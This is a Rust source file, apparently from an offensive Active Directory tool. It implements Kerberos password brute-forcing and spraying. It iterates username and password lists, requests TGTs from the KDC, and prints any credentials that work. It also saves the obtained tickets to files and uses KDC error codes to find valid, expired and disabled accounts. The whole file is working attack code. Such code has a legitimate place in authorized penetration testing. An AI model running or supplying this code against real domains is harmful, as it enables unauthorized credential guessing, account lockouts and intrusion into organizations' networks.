use crate::core::request_tgt;
use crate::core::save_cred_in_file;
use crate::core::CredentialFormat;
use crate::core::KerberosUser;
use crate::error::{Error, Result};
use crate::transporter::KerberosTransporter;
use kerberos_constants::error_codes;
use kerberos_crypto::Key;
use log::{debug, error, info, warn};

pub fn brute(
    realm: &str,
    usernames: Vec<String>,
    passwords: Vec<String>,
    transporter: &dyn KerberosTransporter,
    cred_format: Option<CredentialFormat>,
) -> Result<()> {
    let mut non_test_users = Vec::new();
    let mut valid_users = Vec::new();

    for password in passwords.iter() {
        for username in usernames.iter() {
            if non_test_users.contains(&username) {
                continue;
            }

            let user = KerberosUser::new(username.clone(), realm.to_string());
            let user_key = Key::Secret(password.clone());

            let result = request_tgt(&user, &user_key, true, &*transporter);

            match result {
                Ok(krb_cred) => {
                    println!("{}:{}", username, password);

                    if let Some(cred_format) = cred_format {
                        let filename = format!("{}.{}", username, cred_format);
                        match save_cred_in_file(
                            &filename,
                            krb_cred,
                            cred_format,
                        ) {
                            Ok(_) => info!(
                                "Save TGT for {} in {}",
                                username, filename
                            ),
                            Err(err) => {
                                warn!(
                                    "Error saving TGT for {} in {}: {}",
                                    username, filename, err
                                );
                            }
                        }
                    }
                }
                Err(err) => match &err {
                    Error::KrbError(krb_error) => match krb_error.error_code {
                        error_codes::KDC_ERR_C_PRINCIPAL_UNKNOWN => {
                            info!("Invalid user {}", username);
                            non_test_users.push(username);
                        }
                        error_codes::KDC_ERR_PREAUTH_FAILED => {
                            debug!("Invalid creds {}:{}", username, password);

                            if !valid_users.contains(username) {
                                info!("Valid user {}", username);
                                valid_users.push(username.to_string());
                            }
                        }
                        error_codes::KDC_ERR_KEY_EXPIRED => {
                            println!("{}:{} Expired", username, password);
                            non_test_users.push(username);
                        }
                        error_codes::KDC_ERR_CLIENT_REVOKED => {
                            error!("Blocked/Disabled {}", username);
                            non_test_users.push(username);
                        }
                        _ => {
                            warn!("{}", err);
                        }
                    },

                    Error::NetworkError(_, _) => return Err(err),

                    Error::String(err) => {
                        warn!("{}", err);
                    }
                },
            }
        }
    }

    return Ok(());
}
